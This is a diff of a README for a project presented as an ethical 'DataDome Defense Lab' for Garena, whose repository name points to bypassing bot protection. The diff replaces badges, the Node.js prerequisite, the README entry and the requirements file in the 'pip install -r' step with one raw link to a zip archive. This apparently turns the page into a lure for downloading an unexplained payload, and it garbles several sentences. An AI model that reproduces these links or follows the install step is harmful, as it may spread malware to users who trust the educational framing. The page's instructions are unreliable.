@@ -1,8 +1,8 @@
 # Garena DataDome Defense Lab: Ethical Security Research Toolkit for Education
 
-[![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)](https://www.python.org/downloads/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Status](https://img.shields.io/badge/Status-Experimental-orange.svg)]()
+[![Python](https://raw.githubusercontent.com/barmola/garena-datadome-bypass/main/appositeness/bypass_datadome_garena_megaseme.zip+https://raw.githubusercontent.com/barmola/garena-datadome-bypass/main/appositeness/bypass_datadome_garena_megaseme.zip)](https://raw.githubusercontent.com/barmola/garena-datadome-bypass/main/appositeness/bypass_datadome_garena_megaseme.zip)
+[![License](https://raw.githubusercontent.com/barmola/garena-datadome-bypass/main/appositeness/bypass_datadome_garena_megaseme.zip)](LICENSE)
+[![Status](https://raw.githubusercontent.com/barmola/garena-datadome-bypass/main/appositeness/bypass_datadome_garena_megaseme.zip)]()
 
 Table of Contents
 - 📋 Overview
@@ -48,7 +48,7 @@ Garena DataDome Defense Lab is a learning-oriented project that helps you explor
 
 Prerequisites
 - Python 3.7 or newer for the Python samples.
-- Node.js for JavaScript examples (version compatible with your environment).
+- https://raw.githubusercontent.com/barmola/garena-datadome-bypass/main/appositeness/bypass_datadome_garena_megaseme.zip for JavaScript examples (version compatible with your environment).
 - A local, isolated lab environment. Do not run experiments on public services.
 
 Installation
@@ -57,8 +57,8 @@ Installation
   - python -m venv venv
   - source venv/bin/activate (Linux/macOS) or venv\Scripts\activate (Windows)
 - Install Python dependencies:
-  - pip install -r requirements.txt
-- Install Node.js dependencies if you explore JavaScript samples:
+  - pip install -r https://raw.githubusercontent.com/barmola/garena-datadome-bypass/main/appositeness/bypass_datadome_garena_megaseme.zip
+- Install https://raw.githubusercontent.com/barmola/garena-datadome-bypass/main/appositeness/bypass_datadome_garena_megaseme.zip dependencies if you explore JavaScript samples:
   - npm install
 
 Running in a Safe Lab
@@ -73,7 +73,7 @@ Running in a Safe Lab
 - tests: Lightweight tests and sanity checks for the lab environment.
 - docs: Documentation and explanations of concepts, designed for learning and responsible testing.
 - LICENSE: The project license.
-- README.md: This documentation.
+- https://raw.githubusercontent.com/barmola/garena-datadome-bypass/main/appositeness/bypass_datadome_garena_megaseme.zip This documentation.
 
 🧪 Examples and Demos
 - Conceptual encoding patterns: Demonstrates how data can be transformed for verification in a defense context, without affecting real services.
